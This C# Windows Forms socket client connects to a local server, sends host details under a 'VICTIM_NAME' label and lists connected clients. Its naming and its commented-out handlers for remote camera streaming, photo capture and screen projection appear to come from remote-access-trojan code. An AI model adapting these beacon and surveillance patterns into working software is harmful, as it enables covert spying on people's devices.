using Hiatme_Client.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Xamarin.Essentials;
namespace Hiatme_Client
{
    public partial class Form1 : Form
    {
        public static Socket oursocket = default;
        private const string IP = "127.0.0.1";
        private const int PORT = 8443;
        //private const int PORT = 5000;
        public string PASSWORD = string.Empty;
        public Form1()
        {
            InitializeComponent();
            Connect_Setup();
            
        }
        private async void RequestClientsList()
        {
            await Task.Run(async () =>
            {
                try
                {
                    if (oursocket != null)
                    {
                        sendToSocket("REQCLIENTLIST", "[VERI][0x09]");
                        //sendToSocket("REQCLIENTLIST", "[VERI]" + "Client id goes here" + "[VERI][0x09]");
                    }
                }catch (Exception ex)
                {
                    await Task.Delay(2000);
                }
                });
        }
        public async void Connect_Setup()
        {
            await Task.Run(async () =>
            {
                try
                {
                    if (oursocket != null)
                    {
                        oursocket.Close();
                    }
                    oursocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);

                    //Soketimiz.NoDelay = true;
                    /////endpForMic = endpoint;
                    //Soketimiz.ReceiveBufferSize = int.MaxValue; Soketimiz.SendBufferSize = int.MaxValue;

                    oursocket.Connect(IPAddress.Loopback, PORT);
                    
                    sendToSocket("IP", "[VERI]" +
                        MainValues.VICTIM_NAME + "[VERI]" + RegionInfo.CurrentRegion + "/" + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName
                       + "[VERI]" + "Manufacturer here" + "/" + "model here" + "[VERI]" + "version here" + Environment.OSVersion.ToString() + "[VERI][0x09]");

                    SetSocketKeepAliveValues(oursocket, 2000, 1000);
                    infoAl(oursocket);

                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                    await Task.Delay(2000);
                    Connect_Setup();
                }
            });
        }
        public async void infoAl(Socket sckInf)
        {
            try
            {
                NetworkStream networkStream = new NetworkStream(sckInf);
                System.Text.StringBuilder sb = new System.Text.StringBuilder();
                int thisRead = 0;
                int blockSize = 2048;
                byte[] dataByte = new byte[blockSize];
                while (true)
                {
                    thisRead = await networkStream.ReadAsync(dataByte, 0, blockSize);
                    sb.Append(System.Text.Encoding.UTF8.GetString(dataByte, 0, thisRead));
                    sb = sb.Replace("[0x09]KNT[VERI][0x09]<EOF>", "");
                    while (sb.ToString().Trim().Contains("<EOF>"))
                    {
                        string veri = sb.ToString().Substring(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
                        Data_Coming_From_Our_Socket(veri.Replace("<EOF>", "").Replace("[0x09]KNT[VERI][0x09]", ""));
                        sb.Remove(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
                    }
                }
            }
            catch (Exception)
            {
                //Prev.global_cam.StopCamera(); key_gonder = false; micStop();
                //stopProjection(); Baglanti_Kur();
            }
        }
        public async void sendToSocket(string tag, string mesaj)
        {
            try
            {
                //Console.WriteLine("boo");
                //Console.WriteLine(mesaj);
                using (NetworkStream ns = new NetworkStream(oursocket))
                {
                    byte[] cmd = System.Text.Encoding.UTF8.GetBytes("[0x09]" + tag + mesaj + $"<EOF{PASSWORD}>");
                    await ns.WriteAsync(cmd, 0, cmd.Length);
                }

            }
            catch (Exception) { }
        }
        private async void test(string[] arrstr)
        {
            await Task.Run(async () =>
            {
                try
                {
                    Invoke((MethodInvoker)delegate
                    {
                    for (int i = 1; i < arrstr.Length; i++)
                    {
                        //MessageBox.Show("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + arrstr[i]);

                            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + arrstr[i]);
                      
                    }
                    listBox1.EndUpdate();
                    });
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            });
        }
        private void Data_Coming_From_Our_Socket(string data)
        {

            string[] _parts_ = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
                foreach (string str in _parts_)
                {
                    string[] separator = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                    try
                    {
                        switch (separator[0])
                        {
                        case "RECCLIENTLIST":
                            //MessageBox.Show(separator[1]);
                            test(separator);








                            break;
                            /*
                                case "LIVESTREAM":
                                    string kamera = separator[1];
                                    string flashmode = separator[2];
                                    string cozunurluk = separator[3];
                                    MainValues.quality = separator[4];
                                    string focus = separator[5];
                                    Prev.global_cam.StartCamera(int.Parse(kamera), flashmode, cozunurluk, focus);
                                    break;
                                case "LIVESTOP":
                                    Prev.global_cam.StopCamera();
                                    break;
                                case "SCREENLIVEOPEN":
                                    ImageAvailableListener.quality = int.Parse(separator[1].Replace("%", ""));
                                    startProjection();
                                    break;
                                case "PrepareScreen":
                                    if (PackageManager.HasSystemFeature(PackageManager.FeatureCameraAny))
                                    {
                                        prepareScreen();
                                    }
                                    else
                                    {
                                        sendToSocket("NOCAMERA", "[VERI][0x09]");
                                    }
                                    break;
                                case "CAM":
                                    MainValues.front_back = separator[1];
                                    MainValues.flashMode = separator[2];
                                    MainValues.resolution = separator[3];
                                    kameraCek(oursocket);
                                    break;
                                case "CAMHAZIRLA":
                                    if (PackageManager.HasSystemFeature(PackageManager.FeatureCameraAny))
                                    {
                                        kameraCozunurlukleri();
                                    }
                                    else
                                    {
                                        sendToSocket("NOCAMERA", "[VERI][0x09]");
                                    }
                                    break;
                                case "PRE":
                                    preview(separator[1]);
                                    break;
                            */
                    }
                    }
                    catch (Exception)
                    {

                    }
                }

        }
        public void SetSocketKeepAliveValues(Socket instance, int KeepAliveTime, int KeepAliveInterval)
        {
            //KeepAliveTime: default value is 2hr
            //KeepAliveInterval: default value is 1s and Detect 5 times

            //the native structure
            //struct tcp_keepalive {
            //ULONG onoff;
            //ULONG keepalivetime;
            //ULONG keepaliveinterval;
            //};

            int size = Marshal.SizeOf(new uint());
            byte[] inOptionValues = new byte[size * 3]; // 4 * 3 = 12
            bool OnOff = true;

            BitConverter.GetBytes((uint)(OnOff ? 1 : 0)).CopyTo(inOptionValues, 0);
            BitConverter.GetBytes((uint)KeepAliveTime).CopyTo(inOptionValues, size);
            BitConverter.GetBytes((uint)KeepAliveInterval).CopyTo(inOptionValues, size * 2);

            instance.IOControl(IOControlCode.KeepAliveValues, inOptionValues, null);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            RequestClientsList();
        }

        private void button2_Click(object sender, EventArgs e)
        {
        }
    }
}
